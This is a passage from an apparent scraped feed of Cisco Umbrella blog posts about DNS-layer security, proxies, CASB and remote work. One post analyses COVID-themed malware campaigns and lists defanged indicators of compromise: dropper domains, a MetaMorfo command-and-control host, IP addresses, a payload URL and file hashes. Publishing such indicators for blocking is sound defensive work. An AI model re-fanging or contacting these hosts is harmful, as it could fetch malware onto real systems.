private fork of custom resolver software originally based on djbdns source code, which reduces the risk of exploits drastically. Related systems are always patched. 5. The first service to encrypt DNS traffic to secure the “Last Mile” Just as SSL turns HTTP web traffic into HTTPS, Umbrella uses DNSCrypt to turn regular DNS into encrypted DNS traffic, easily securing the “last mile” of DNS traffic between you and the Umbrella resolvers. The optional endpoint client secures DNS from man-in-the-middle attacks without any changes to domain names or how they work. 6. Support for DNSSEC Cisco Umbrella supports DNSSEC , a technology developed to protect against cache poisoning attacks by digitally signing data. Umbrella performs validation on queries sent from Umbrella resolvers to upstream authorities. 7. Transparent operational excellence Umbrella’s network operations center maintains 24/7 watch over the entire internet for routing issues, as well as our global infrastructure for incidents. Since 2006, the Umbrella global network has delivered 100% reliability and business uptime. We believe in transparency – check out our 30-day view of operational messages via our system status . 8. Unbeatable performance and reliability with Anycast routing Cisco Umbrella offers fast and secure internet access across network devices, branch offices, and roaming users. Umbrella’s DNS-layer security uses Anycast routing — every data center announces the same IP address, so requests are transparently sent to the fastest available with automated failover. Even if multiple locations go offline, there are no service disruptions because DNS requests are routed to get your users exactly where they need to go. 9. Over 900 peers at internet exchange points Bye bye, latency. More than nine hundred peering partnerships with ISPs and CDNs provide shortcuts between networks, enabling us to resolve requests faster — and boost internet speed. 10. Smarter DNS cache technology Substituting invalid responses with the last-known IP address enables a better internet experience. Our DNS record-handling technology renders frustrating authoritative DNS outages irrelevant for Cisco Umbrella users. If a domain’s authoritative name server becomes unreachable or misconfigured, Umbrella SmartCache lets you connect with confidence and returns the expired DNS response rather than an error. Need more reasons? Start a free trial and start your own top 10 list! With more than 20,000 happy customers, we’re sure you’ll agree that Cisco Umbrella is the fastest way to protect your users.", "date": "2020-02-11"},
{"website": "Cisco-Umbrella", "title": "What is a Proxy Server?", "author": ["Andrew Tsui"], "link": "https://umbrella.cisco.com/blog/what-is-a-proxy-server", "abstract": "Overview A proxy server (also known as “a proxy” in IT circles) is an intermediary between an end user/computer and the internet. A proxy server acts just like a traffic conductor.  Depending on where the proxy server lies in your network (more on this later), it will inspect and route internet traffic to/from the user and the requested web address. Proxy servers have evolved over the years, and offer features and functions well beyond standard web trafficking.  Many proxy servers used today will act as a major line of defense for internet users, address key use cases and compliance concerns such as network security and privacy policies, and help regulate internet traffic and usage. Different Types of Proxies Today’s market is comprised of different types of proxy servers.,While similar, the names and functionality are often confused and interchanged.  Below is a breakdown of a few common types: Full Proxy: Typically a proxy that intercepts all web traffic. Forward Proxy: When end user web requests are forwarded to a proxy before going out to the internet, and responses go back through the proxy and then back to the user for privacy, greater visibility, content control, and threat protection. Reverse Proxy: Typically a control point that is closer to the web resources, which helps with safe and efficient content distribution from the website back to the requestor. Primarily used by popular web sites and a few CASB solutions . Secure Web Gateway (SWG) : A more advanced form of web proxy that typically provides more granular control and a broader set of security functions to protect against online threats. Use Cases: Three Reasons to Use a Proxy Server Security: Proxy servers can act as a first line of defense against malicious activity.  Many proxies today allow you to customize your settings to do things like block known sites that contain malware, and give you the ability to encrypt your data as it travels through the web.  A common practice for today’s organizations is to pair their proxy with a Next Generation Firewall (NGFW) and Virtual Private Network (VPN) , ensuring that remote users are always accessing the internet through their organization’s proxy server — helping adhere to company regulations and standards. Privacy: One of the key attributes of a proxy server is the ability to provide individuals and organizations increased privacy while browsing the internet. Some proxies even have the ability to change a user’s IP address, providing complete anonymity as they browse the web. Monitor Internet Traffic/Usage: Proxies are also a great way for organizations to manage and control content and provide threat protection for their users.  If an organization does not want their employees to view/visit certain websites through their network(s), they can configure their proxy server settings to deny access to such sites.  Organizations can also use proxy servers to monitor and log web traffic requests — providing visibility not only into peak hours of network activity, but also the most requested sites and the time spent on them. Key Takeaway Proxy servers are a key tool used by both organizations and individuals to help route, monitor, and secure web browsing.  Cloud-based proxy services are becoming a more popular way to deliver this set of capabilities. It should come as no surprise that features and functionalities will continue to evolve to keep up with security and privacy needs. Interested in learning more about our cloud-based proxy service, and Cisco Umbrella? With a free 14-day trial of Cisco Umbrella, you’ve got nothing to lose. Start a free trial now!", "date": "2020-02-25"},
{"website": "Cisco-Umbrella", "title": "What is CASB?", "author": ["Andrew Tsui"], "link": "https://umbrella.cisco.com/blog/what-is-casb", "abstract": "Overview A Cloud Access Security Broker (CASB) acts as an intermediary between cloud providers, cloud-based applications, and cloud consumers to enforce an organization’s security policies and usage. It is no secret that cloud adoption and the use of cloud applications can accelerate and optimize an organization’s workflow and productivity. However, it also poses a major security risk.  One of the main objectives of a CASB is to keep an organization’s data safe and secure. Why do I need a Cloud Access Security Broker? As organizations evolve and cloud adoption grows, inevitably, additional cloud applications will be integrated within their networks.  For all of the benefits and optimization that cloud-based applications provide, they also present a significant threat plane and opportunity for adversaries to steal intellectual property.  Securing these cloud applications and the data within them is critical to business operations. There are several avenues that adversaries can use to get into the corporate network and exfiltrate sensitive data. Organizations need to be able to monitor user behavior, protect sensitive data, and monitor third-party connected apps in order to protect their users and data. Are cloud applications safe to use? Generally, yes.  However, the proper precautions need to be taken to ensure that the users and data using such cloud applications are secure.  As long as businesses understand the risks and vulnerabilities associated with using cloud applications, they should be able to put a strategy in place that helps keep them secure. Tools like a CASB should be a key part of that strategy, and are designed specifically to secure organizations, their users, and ultimately the data shared within cloud apps. Is a CASB all I need for cloud security? Similar to endpoint security and data center security, cloud security requires a comprehensive, holistic approach. A CASB is a critical component of cloud security, but businesses need additional solutions such as secure web gateways , email security , public cloud monitoring solutions , next-generation firewall integrated cloud solutions , and others. Three CASB Use Cases User and Entity Behavior Analytics : A CASB provides visibility into user accounts across your network, helping to defend against compromised accounts and malicious insiders with User and Entity Behavior Analytics (UEBA). Typically UEBA runs against an aggregated set of cross-platform activities providing visibility into things such as user login and network access, as well as providing insight into privileged account compromises. Data Loss Prevention (DLP) : Protecting an organization’s data is usually priority number one. A CASB can provide data loss with sets of predetermined rules or the ability to customize policies to fit individual organizational policies. OAuth and Shadow IT : As mentioned, leveraging the flexibility and integrations between cloud-native applications can be extremely beneficial for an organization. However, what users may not realize is that apps that are interconnected in the cloud can also serve as a backdoor for attackers. A CASB can help you: Uncover connected apps within your network Manage permissions and settings for connected apps Revoke connections for malicious or high-risk apps Secure access to cloud applications Key Considerations When Choosing a CASB User Security Visibility: The first obstacle for organizations trying to provide sufficient user security is visibility. In large organizations, there are a large number of users accessing multiple applications in multiple cloud environments. A CASB solution must provide significant visibility into user activity across all of the SaaS applications they access. Threat protection: While significant user visibility is critical, it is not enough to achieve full user security. By leveraging the data and analytics gained by deep visibility, organizations can provide significant threat protection for their users. The exponential growth of multi-cloud activity has increased the attack perimeter, and IT professionals cannot keep up with all of the threat alerts. Large-scale analytics and machine learning allow a CASB solution to automate threat alerts and responses to achieve more robust, agile user security. Data security Control: The first step to helping ensure data security is control. Organizations should restrict access to areas where the information is not critical to an employee’s job functions. Once attackers are in the network, they will attempt to move laterally to access secure data. While organizations may want to trust their employees and grant access, this can greatly increase the attack surface. When in doubt, limit access points to significant data. Visibility: Similar to user security, visibility is a crucial step to promoting data security. Storing sensitive data across a multi-cloud environment can be risky. In addition, the explosion of cloud solutions and remote access points in organizations has increased the amount of data collaboration. More and more, organizations are sharing sensitive data across multiple cloud environments. Controlling access to sensitive data can be very effective, but there will constantly be newly forming connections within a network. As a result, organizations need visibility into what data is going where and the ability to block sensitive information from being shared inappropriately. App Security Discover: Most organizations would be dismayed if they saw the number of applications their entire network is using. Applications can be very beneficial, but it is important to know which ones are accessing organizational data at any given time. A CASB solution should provide discovery and visibility of third-party connected apps and enable the customer to disconnect from risky or inappropriate apps. Classify: Once an application is discovered, a CASB should classify it. In some scenarios, like Google Apps, these applications may unknowingly have access to sensitive data. While it may seem harmless, a malicious application can cause serious damage. To allow employees to work efficiently but safely, a CASB needs to quickly classify: What is this application? Is it safe? What data does it access? Disable risky apps: Once discovered and classified, the application should be enabled or disabled. In most cases, the application has been downloaded or accessed to improve an employee’s productivity. If the application has been classified as safe and beneficial and the permissions are appropriate, it can be left alone. If the application is classified as a threat, it should be immediately disabled. Key Takeaway Cloud Access Security Brokers act as an intermediary that helps to secure the use of cloud-based applications and protect the users working within them. If working with any cloud-based application, organizations of all sizes should consider using a CASB solution to help monitor User and Entity Behavior Analytics, Data Loss Prevention, and app-to-app communication, with the ultimate objective of securing sensitive user data and intellectual property. Sign up for our free Cisco Umbrella Live Demo and see the power of CASB for yourself.", "date": "2020-03-03"},
{"website": "Cisco-Umbrella", "title": "DNS-Layer Security: What It Is and Why You Need It", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/what-is-dns-layer-security", "abstract": "In today’s blog, we’ll take a deeper dive into DNS-layer security — what it is, how it works, and how it can transform your network security for the better. The basics of DNS First, let’s review some fundamentals. The domain name service (DNS) is often referred to as the “phone book” of the Internet. Every computer on the Internet identifies itself with an “Internet Protocol” or “IP” address, which is a series of numbers. All servers that host websites and apps have IP addresses, too. For example, the IP of the Cisco Umbrella website is 67.215.70.40. You can connect to our website by typing in the IP address in the address bar of your browser, but it’s much easier to type in umbrella.cisco.com. DNS was invented so that people didn’t need to remember long IP address numbers (like phone numbers) and could look up websites by human-friendly names like umbrella.cisco.com instead. There are too many sites on the Internet for each computer to keep a complete list, so DNS servers power the directory to make things easier for humans. You probably use DNS about a thousand times every single day – websites, software updates, and mobile phone apps all rely on the service. That’s why we sometimes refer to it as the foundation of the internet. Recursive versus authoritative DNS servers There are two types of DNS servers. Let’s go back to the phone book analogy. Imagine you sit down at your computer and type umbrella.cisco.com into your browser. First, your browser connects to a recursive DNS server . There are many thousands of recursive DNS servers in the world. Which one you use is configured in the settings of your computer or network. If you have never tinkered with your recursive DNS in the past, you probably use the recursive DNS servers of whoever provides your Internet. At your house, this may be a cable company. On your phone, it is your cellular provider. At the coffee shop down the street, it’s their Internet Service Provider. Once your computer connects to the recursive DNS server, it asks the question “what’s the IP address assigned to umbrella.cisco.com?” The recursive DNS server doesn’t have a copy of the phone book, but it does know where to find one. So it connects to another type of DNS server. The second type of DNS server holds a copy of the phone book that matches IP addresses with domain names. These are called authoritative DNS servers . The authoritative DNS server tells the recursive DNS server about the correct IP address assigned to the domain name, and the recursive DNS server sends that information back to the computer (and browser) that requested it. The computer connects to the IP address, and the website loads, leading to one happy user. Whew, that was easy! This all happens so quickly that you might not even notice it happening at all unless something is broken. Not all DNS services are created equally. If the recursive DNS service you use breaks for some reason, you won’t be able to connect to websites. If the recursive DNS service you use is slow, then your connection to websites will be slow. If your DNS servers are not up-to-date, then you may not be able to connect correctly to websites. Cisco Umbrella (formerly known as OpenDNS) started its recursive DNS service to provide everybody with the most reliable, safest, smartest, and fastest Internet connectivity in the world. Umbrella has a highly resilient recursive DNS network that boasts 100% uptime since 2006. Our 30-plus worldwide data centers use Anycast routing, so requests are transparently sent to the fastest available data center with automatic failover. By configuring your network to use Umbrella’s recursive DNS service, you’ll get the fastest and most reliable connectivity you can imagine. But that’s not all Cisco Umbrella can do. That brings us to our next topic: DNS-layer security. DNS-layer security Your computer uses recursive DNS as the first step to connect to places on the Internet. Unfortunately, so do cyber criminals. Malware, ransomware, phishing and other scams use DNS servers to look up and connect to infrastructure that is set up by cyber criminals to power these attacks. Monitoring DNS requests, as well as subsequent IP connections, is an easy way to provide better accuracy and detection of malicious activity and compromised systems, improving security visibility and network protection. Nothing stops attacks earlier than DNS-layer security. After all, DNS is the first step in making a connection on the Internet, and if a connection is blocked at the DNS layer, then it stops there. Cyber attacks have many phases. Before launching, the attacker first needs to stage internet infrastructure to support each phase of the attack. Then, the target needs to be connected to that infrastructure. Many attacks use email attachments or direct payload downloads, or use malicious links in phishing attacks. Attacks with an objective to exfiltrate data must initiate a command & control callback, where the malware on a network communicates back with the attacker infrastructure, which then takes command of the targeted machine. DNS-layer security identifies where these domains and other internet infrastructures are staged, and blocks requests over any port or protocol, preventing both infiltration and exfiltration attempts. It stops malware earlier and prevents callbacks to attackers if infected machines connect to your network. Figure 1: The blue shields show where DNS-layer security stops attacker communications Why Cisco Umbrella for DNS-layer security? As a leading provider of network security and recursive DNS services, Cisco Umbrella provides the quickest, most effective way to improve your security stack. From small businesses without dedicated security professionals to multinational enterprises with complex environments, it only takes minutes to gain a new layer of breach protection and internet-wide visibility on and off your network. Here are just some of the benefits you’ll gain by using Cisco Umbrella for DNS-layer security. Block threats before they reach you Traditional security appliances and agents must wait until malware reaches the perimeter or endpoint before they can detect or prevent it. With DNS-layer security from Cisco Umbrella, you can stop attacks earlier in the kill chain. By enforcing security at the DNS layer, Umbrella stops threats before they ever reach your network or endpoints. By analyzing and learning from internet activity patterns, Umbrella automatically uncovers attacker infrastructure staged for current and emerging threats, and proactively blocks requests to malicious destinations before a connection is even established or a malicious file downloaded. Umbrella can also stop compromised systems from exfiltrating data via command & control (C2) callbacks to the attacker’s botnet infrastructure, over any port or protocol. Unlike appliances, our cloud security platform protects devices both on and off the corporate network. Unlike agents, the DNS layer protection extends to every device connected to the network — even IoT. Umbrella really can be deployed everywhere, since all internet-connected devices use recursive DNS services. Leverage the power of machine learning Cisco Umbrella uses machine learning to search for, identify, or even predict malicious domains. Umbrella learns from internet activity patterns to automatically identify attacker infrastructure being staged for the next threat, and blocks these domains proactively. We analyze terabytes of data in real-time across all markets, geographies, and protocols. This diversity provides internet-wide visibility into where threats are coming from, who is launching them, where they call back to, how widespread it is, when was the first and last time we saw it, and much more. We combine human intelligence with 3D visualizations to learn new patterns. Then, we apply statistical models to categorize these patterns, detect anomalies, and automatically identify known and emergent threats. Figure 2: How our machine learning model works Our statistical models predict which domains and IPs will be malicious — often before any other security vendor. For example, one model uses natural language processing to detect domain names that spoof brand and tech terms in real time (cs.co/NLPRank). Another uses sound wave analysis concepts to detect domains that have spikes in their DNS request patterns (cs.co/SPRank). Power up your incident response and investigations Umbrella logs all DNS activity, both normal and malicious, to simplify investigations. Umbrella reduces the number of infections and alerts you see from other security products by stopping threats at the earliest point. And Cisco Threat Response automates integrations across Cisco products for even quicker answers. The Umbrella Investigate console and API provides real-time context on malware, phishing, botnets, and other threats, enabling faster incident investigation and response. Imagine having the strength of over 300 security researchers on your team — that’s what you get with Cisco Talos threat intelligence, which is built right into Cisco Umbrella. Get started today Cisco Umbrella is the simplest cloud security service you’ll ever deploy. There is no hardware to install or software to manually update, and the browser-based interface provides quick setup and ongoing management. And more importantly – it works! Brand new third-party research from AV-TEST reveals that Cisco Umbrella is the industry leader in DNS-layer security. You can learn more about the efficacy of our DNS-layer security in our recent blog post. Ready to get started? Sign up for our free Cisco Umbrella Live Demo and see what a difference DNS-layer security can make for your organization.", "date": "2020-03-10"},
{"website": "Cisco-Umbrella", "title": "Navigating Cybersecurity During a Pandemic: Latest Malware and Threat Actors", "author": ["Andrea Kaiser", "Shyam Sundar Ramaswami"], "link": "https://umbrella.cisco.com/blog/navigating-cybersecurity-during-a-pandemic-latest-malware-and-threat-actors", "abstract": "The coronavirus (COVID-19) outbreak tops all the news, google searches, and social media alerts for good reason. Globally, we need to stay informed of the latest news with this health crisis. However, it’s also in the news due to malicious threat actors using COVID-19 as a lure to trick people into giving up account credentials, or to download malware. In this blog post, we’re going to discuss the latest ways that we’ve seen threat actors using the current health crisis in malicious campaigns, and the increase in Internet requests related to COVID-19 material. Mass Information Threat actors often use the latest world events, popular news headlines, holidays etc. as themes for malware content in order to stay relevant and entice victims to visit malicious websites or open malicious attachments in email. Given the global reach and urgency of the current health crisis, it’s not surprising that COVID-19 has become a means for threat actors to deliver their latest malicious content. Earlier this month, Brian Krebs reported on the use of fake coronavirus live update style maps to spread the AzorUlt information stealing trojan. The public is very interested in staying up to date on where the latest COVID-19 cases are happening around the world. If we use Cisco Umbrella Investigate to look at the amount of query traffic seen on our resolvers going to one of these domains hosting a malicious live update map, you can see a spike in requests to this domain starting on March 11th, and continuing to gain more queries and maintain a steady flow of requests. Investigate shows query traffic to a domain hosting a malicious COVID-19 map A Surge in New Domains We have certainly seen a surge in Internet requests to domains that include the word ‘covid’ or ‘corona’ over the past two months. On February 19, our enterprise customers made 562,144 queries to 8,080 unique domains containing these keywords. We saw an increase of 1,907% in requests being made by March 19th, from 11,287,190 requests, across 47,059 domains containing these keywords. 4% of these 47k domains were blocked as malicious sites. Below is a list of popular keywords we’ve seen used together with corona, virus, and covid for new domain registrations: wuhan clinics lab tests selftestkit purchase kits helpline A domain for sale using the keywords covid-19-wuhan Malspam Attacks Threat actors continue to use email as an infection method, with malicious documents or embedded malicious links. One approach is disguising the email as coming from the World Health Organization. The emails state that the attachment contains important safety measures as directed from the WHO. These attachments have been seen to be an archive file, pdf, or doc. Some of the malware threats that we’re tracking associated with COVID-19 scams are highlighted below. Kpot Description: Kpot is an information stealer that steals user data and account credentials. It is very easily available in various underground forums for a price of around $100 USD. Nanocore Description: NanoCore RAT is a Remote Access Trojan which was first spotted in 2013. Since then, it has been available on the Dark Web. This trojan can be modified by its users as per their needs. The malware is capable of registry editing, process control, upgrade, file transfer, keylogging, and password stealing. Guloader Description: GuLoader is a downloader, written partly in VB6, which typically stores its encrypted payloads on Google Drive or Microsoft OneDrive. It is usually distributed as a portable executable (PE) file that is often observed embedded in a container file such as an .iso or .rar file. It is used predominantly to download Remote Access Trojans (RATs) and information stealers such as Agent Tesla, FormBook, NanoCore RAT, Netwire RAT, Remcos RAT, Ave Maria/Warzone RAT and Parallax RAT. Trickbot Description: TrickBot was first seen in 2016 and is a banking trojan with advanced browser manipulation techniques, server-side injections and redirection techniques. It has most famously been associated with malspam spread through the Emotet botnet and Trickbot’s Command and Control servers have been seen as IOCs during investigations of Ryuk ransomware infections. Trickbot has the ability to steal email credentials and address book information that is used to send malspam from the affected accounts. In 2020, Trickbot began to target Active Directory DCs and bypass Windows UAC elevated privlege alerts. Trickbot can spread laterally through an internal network. Formbook Description: Formbook is a trojan information stealer spread through malspam with malicious document or archive attachments. It was first observed in 2017. It operates with the Malware-as-a-service (MaaS) model making it easy for cyber criminals to operate. Netwire Description: NetWire is a remote access trojan (RAT) which is widely used by cybercriminals since 2012. NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers. Other targets include credentials for online accounts and applications such as email, property management systems (PMS), and internet browsers. Other sensitive information typed by the user, including Social Security numbers, phone numbers, addresses, and birthdates can also be compromised. It was used in attacks against banks and healthcare companies and scammers to remotely control infected systems. MetaMorfo Description: Metamorfo is a banking trojan first seen in April 2018. Metamorfo’s primary target location at the onset was Brazil. Today, it’s targets have spread to USA, Chile, Spain, Mexico and others. The trojan gathers financial information, credit card numbers, and personal data. MetaMorfo: ‘Important Information’ We’re going to look into a malspam campaign that dropped the MetaMorfo payload. The targets of this malspam campaign were primarily Brazilian citizens. The emails contained a malicious attachment when opened that would lead to the download of a zip archive. This file starts the malicious process to drop MetaMorfo onto the victim’s system. English Translation: Dear User, • Read the conversation history that was sent to this email with WhatsApp Conversation at: 03/25/2020.txt The hyperlink leads to: hxxp://www.servicosfcporto[.]com/upcloud7?WhatsApp_Historico_de_Conversas?whatsapphistorico/index.html?visualizar=c06e8cf10aeaf00c33360d2b2bfb6792 One of the dropper/redirect domains redirecting to download malicious content from Dropbox A 301 call redirect from one of the observed domains to download content from Dropbox Cisco Umbrella was able to detect the redirect/dropper domains used in this campaign with intelligence from our statistical models. We convicted the domain when we saw a suspicious spike in query traffic and other dns factors. For a deeper look into the statistical models that caught this campaign and others like it, please see some presented research here by Dhia Mahjoub. Investigate shows a spike in query traffic from a dropper/redirect domain Allowing the MetaMorfo trojan to execute in a sandbox reveals a command and control server resolving to the following ip addresses: Investigate shows the IP addresses associated with this command and control server We had the following top countries requesting these malicious domains on our resolvers: Requestor geo distribution: Brazil , US, Canada, China, Italy, Poland, Singapore, Russia, Ireland Conclusion Threat actors will use what works to increase malware infections, and the current COVID-19 pandemic is no different. Although it may seem urgent given the current circumstances, it’s best to treat any attachments or links received from unknown or even known individuals with caution before clicking. Cisco continues to track malicious campaigns themed toward COVID-19 along with the many other tactics used by cyber criminals. Our statistical models analyze over 200 billion Internet requests per day, convicting malicious infrastructure before it can be used in attack campaigns. We can also help you better protect all of your remote users with Cisco Umbrella. To learn more, check out this blog or start a free trial today . For up to date information on how Cisco is following the latest in malware campaigns around COVID-19 scams, please refer to the following articles: https://blog.talosintelligence.com/2020/03/covid-19-pandemic-threats.html https://blog.talosintelligence.com/2020/03/covid-19-relief-package.html https://support.umbrella.com/hc/en-us/articles/360041720451 IOCS: Uris: /upcloud4 /upcloud5 /upcloud7 /online8 /update2 Dropper/Redirects: acalvet[.]com acbras[.]com arjoflor[.]com arjoflos[.]com bergadimspower[.]com berkesteermaster[.]com contatoonline1[.]com famartil[.]com oawyri[.]com oawyr[.]com parnerimcarpich[.]com qpfhd[.]com rjmwqf[.]com rstmir[.]com servicosfcporto[.]com sirdexs[.]com MetaMorfo C&C: Megasena1.duckdns[.]org IPs: hxxp://35.192.198[.]16:80/_nomedia.tar 94.177.160[.]157 149.248.55[.]177 80.211.255[.]177 Hashes: 0461143b7daa61fc403f551a705774c4125793316a141135ffaa165a87586a52 Ff9a59d4aace29b9274029f5573f41a91b2493e7f64e976da2dff4e2298fdd44", "date": "2020-04-01"},
{"website": "Cisco-Umbrella", "title": "Secure Anywhere. Protect Everywhere: The Power of Integrated Internet, Endpoint and Email Security", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/secure-anywhere-protect-everywhere", "abstract": "If you’re like me, you’re trying to pack too much “stuff” into your day. From following the news, to now home-schooling the kids, never-ending laundry… and somehow trying to set a good example for work-life balance, there are simply not enough hours in the day. I wake up and look at my calendar and I’m exhausted before it’s 9am. I don’t think I’m alone. The field of cybersecurity is growing so fast. There is always another threat to chase. More remote workers to secure. An alert to track down. Another attack to remediate. Another report to publish or presentation to give. We have to find talent, cut costs, and beat last quarter’s goals, all while living our best life, or at least trying to! We’re security professionals, not magicians, so putting more time back into the day is a dream, not a goal. But by adopting tools that can help us be more efficient, effective and integrated in our approach to detecting and blocking threats in 2020, it can be your reality. If you’re like many organizations, you’re likely struggling to find skilled resources to help you respond faster and more effectively to threats. But with as many as 3.5 million cybersecurity jobs unfilled by 2021 ( hello college students – have you picked a major yet? ) We think it’s time to stop firefighting and take back control of our security programs. Let’s get back to basics and prioritize There has to be a better, simpler way. And I think the answer is getting back to basics. Yes, attacks come from all angles… but in 2020, it’s no surprise that the majority of infections happen in 3 ways. The #1 vector for attacks is email, the #1 target for attacks is the endpoint, and the #1 source of most attacks is the Internet. If we decide to stop working in silos and see how we can identify and stop threats together across these three threat vectors, think of how effective we could be! Imagine if you could identify something on the endpoint, and share that information with both your email AND your web security. Maybe you’re ahead of the game and you’re doing that today… but it’s probably a manual process (if it happens at all). Let’s get automated! Simplify with automation At Cisco we’re using the power of integration to simplify. We start with Cisco Umbrella, a cloud-delivered security service that lets you see internet activity across every location (headquarters, branch offices, remote locations worldwide), every network (including guest networks), and every device (IoT, BYOD, laptops, mobile, etc.) on and off the network. Cisco Umbrella works together with Cisco Advanced Malware Prevention (AMP) for Endpoints and Cisco Email Security to provide a connected security system. Together, we help you see more and gain greater visibility into what’s happening across all of your email, cloud apps, web traffic, and endpoints, no matter where your users go. We help you block more by seeing a threat once and stopping it everywhere across your environment, without manual work from your team. And of course, this helps you respond faster, since you don’t have to bounce between products and consoles to know what to remediate first. Game changer: Cisco Threat Response Sounds too good to be true, right? Think again. Meet Cisco Threat Response. Cisco Threat Response automates integrations across Cisco security products and threat intelligence sources to help you simplify and accelerate critical security operations functions. That way, you can find and confirm the most important threats, easily investigate where and how you’re affected, and remediate faster. The results are distributed intelligence, complete visibility, agile blocking, and automated threat response that lets you see something once — and stop it everywhere — without requiring additional work from your team. It’s time to demand better cybersecurity in 2020. Are you ready to unleash the full power of the Cisco cloud-based portfolio? Say yes to better security. Want to learn more? Read our eBook, Secure Everywhere: The Power of Integrated Internet, Endpoint, and Email Security.", "date": "2020-03-17"},
{"website": "Cisco-Umbrella", "title": "Fast, Simple Cybersecurity for Remote Students and Work From Home Employees", "author": ["Meg Diaz"], "link": "https://umbrella.cisco.com/blog/fast-simple-cybersecurity-for-remote-students-and-employees-working-from-home", "abstract": "With less budget, fewer resources, and more employees working from home than ever, you may be feeling overwhelmed. You are not alone. We’ve entered uncharted waters — but that doesn’t mean you’re left without a paddle and a lifejacket. As you navigate this new world where most people in your company or students and staff in your school district are working remote from home, there’s a way that you can quickly protect their laptops and mobile devices. You can even do it right from your own kitchen (or wherever you find yourself working these days). Why does it matter now? Phish are biting Unfortunately, attackers are always looking for ways to exploit vulnerable situations. This is no exception. We’ve seen some interesting trends from our global cloud infrastructure. Every day we resolve more than 200 billion DNS requests from enterprise and consumer users worldwide — across 190+ countries. Looking at recent trends across that traffic, we’ve seen a 3.5X increase in malware, a 1.7X increase in phishing, a 2.5X increase in command and control callbacks to botnets, and a 2X increase in ransomware. More than a case of the Mondays Remote employees are bypassing the VPN, and the risks of compromised machines are increasing. I’ve heard from many organizations that they tend to see a spike in infected machines on their corporate network on Monday mornings. That’s when everyone connects back after using their work computer for personal use on the weekends. And Mondays are rough enough without dealing with a bunch of infected machines! With more users working remotely, they’re likely skipping the VPN at times. Whether it’s accidental because they forgot to connect or if they must disconnect due to bandwidth restrictions or other reasons, there’s a higher chance they’ll get infected without additional protection on their laptop. Home Wi-Fi doesn’t mean secure Wi-Fi Your users probably have varying degrees of security on their home Wi-Fi networks. So, if they’re connecting to their home Wi-Fi and working without connecting to the VPN, they’re more vulnerable to different types of threats. (Tip: help your employees keep their home network safe with easy-to-use parental controls — check out OpenDNS for home networks ) Protecting remote workers with ease You probably have incredibly limited time — it was true before, and it’s probably even more true right now. There are ways that you can better secure your remote workers, even in a matter of minutes. Cisco Umbrella combines multiple security functions into a single cloud-delivered service — helping you deliver the right level of security anywhere your users work. The simplest way to get started is with DNS-layer security . DNS-layer security can be used to provide the first line of defense against threats on the internet. Any time you click a link or type a URL, the first step that happens is a DNS request to connect the IP address with the requested domain. That’s the perfect place to enforce security — if the domain or IP address is known to be malicious or associated with nefarious activity, users will be safely routed to a block page instead. Easy to deploy in minutes With Umbrella, there’s no hardware to deploy or software to manually update. When it comes to protecting your corporate network, simply point your external DNS requests to the IP address for our global network and all devices connecting to your network will be protected. And if your users should skip the VPN, we’ve got you covered. If you use Cisco AnyConnect, then you can simply enable the Umbrella roaming security module — no additional agents required. It will instantly turn on and send all internet requests to Umbrella when the VPN is off, so users will be protected automatically anywhere they work. Alternatively, you can deploy the Umbrella roaming client , which will work alongside any VPN. “It was easy. We pushed the agent out with our standard deployment tool, we configured it in the cloud, and in almost no time, Umbrella was effectively protecting users wherever they work. And, because it’s a cloud-delivered service, we don’t have to install appliances in our data center or do a lot of configuration.” Joseph Paradi, Sr. Director – ITS Infrastructure, Avanade Read more about Avanade’s experience here or join us for a live chat with Joseph Paradi on April 21 . Results on day 1 With Umbrella deployed, what kind of results will you see? In a customer survey , more than 50% of respondents reported seeing value in less than 1 day. Now that’s fast! Effective, proven cybersecurity With Cisco Umbrella, we leverage intelligence from Cisco Talos, who has more than 300+ security researchers — not too shabby to have the strength of the largest commercial threat intelligence teams behind you. Umbrella leverages statistical and machine learning models to identify attacks before they launch. In recent research conducted by AV-TEST, they placed Cisco Umbrella #1 in threat prevention compared to other vendors — you can check out the full report here . How to deploy For more details on how to deploy Umbrella to your remote users, join our technical webinar on Thursday, March 26th or use the resources below: Enabling the Umbrella roaming module on Cisco AnyConnect Deploying the Cisco Umbrella roaming client Deploying the Umbrella Chromebook client Deploying the Cisco Security Connector for iOS Note: Umbrella support for Android is currently in Limited Availability. If interested, please contact your Cisco account manager Does this seem too good to be true? It’s not. We’ve built a reputation on easy deployment and powerful protection anywhere users go, on or off network. Why? So you can build your security on a solution you can trust. Take a few minutes and find out for yourself why 20,000+ customers rely on Cisco Umbrella for effective threat protection . For more information about Cisco Umbrella, join us on Monday, March 30 for a twenty minute webinar . And finally, to help you during these times, Cisco has a free security offering . Think of it like a lifejacket to keep you safe on this journey — we’re all in this together.", "date": "2020-03-24"},
{"website": "Cisco-Umbrella", "title": "The New Normal: Tips for Working From Home – How to Manage Your Job, Enable Remote Security, and Protect Against Cyber Threats", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/the-new-normal-tips-for-working-from-home-how-to-manage-your-job-enable-remote-security-and-protect-against-cyber-threats", "abstract": "In the coming weeks, we will be featuring a set of #CyberSelfCare blogs to help you educate yourself, your coworkers, family, and friends about how to protect their digital presence. We talk a lot about work-life balance. What does it mean, exactly? In a perfect world, we would spend some time each day working hard at our jobs, and an equal amount of time relaxing at home — maybe spending time with our families, doing hobbies, cooking healthy meals, exercising, getting enough sleep, reading books, and catching up on that amazing new show. If you just do a little bit of everything each day, you’ll be set. Sounds like a great plan, right? Let’s get real. Some days, it feels like an absolute victory if you get one thing done on your work to-do list (as you add five more things to your list before the work day is over). And forget about cooking and exercising — sometimes it’s a good day as long as everyone in your house has eaten something, and you’re too tired to even think about opening a book. Just like with a balanced diet, it’s a myth that you have to get a little bit of everything each day. Some days are going to be full of work, and that’s okay! Other days, you’ll need to prioritize your kids, or your pets, or home repairs, or (maybe… just maybe) yourself. It gets even harder to manage an effective balance between your job and your home life when your home and your office are in the same place. That’s the reality so many of us face today when we work remotely. Working from home is on the rise and is rapidly becoming the new normal. Staying home makes some things easier (like no dry cleaning bills), but makes some things harder (like finding a quiet space to run an important meeting). If you’re new to working from home with young children or pets in the house, you might miss the days where interruptions only came from your boss on the phone or in your inbox. The New Normal: Working From Home The good news is, you’re not alone. Many of us at Cisco work from home, so we’ve had time to develop some ideas about how to make remote work less stressful. Here are some quick tips for managing the challenges of your job when you’re working from home: Set up your working space to be comfortable. You might not have a perfect ergonomic setup, but you can experiment with the height of your screen, whether you sit or stand, and what type of lighting you 